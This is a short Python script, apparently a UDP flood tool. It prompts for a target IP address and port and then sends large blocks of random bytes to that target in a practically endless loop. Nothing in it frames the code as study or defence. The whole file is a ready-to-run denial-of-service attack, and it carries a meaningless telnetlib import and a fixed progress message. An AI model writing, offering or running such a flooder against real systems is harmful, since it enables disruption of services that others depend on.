import socket , random , time

from telnetlib import IP

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

IP = input("Enter target IP : ")

port = int(input("Enter target port: "))

s.connect((IP, port))

for i in range(60,100**1000):
    s.send(random._urandom(60)*1000)
    print(f"send: {60}")
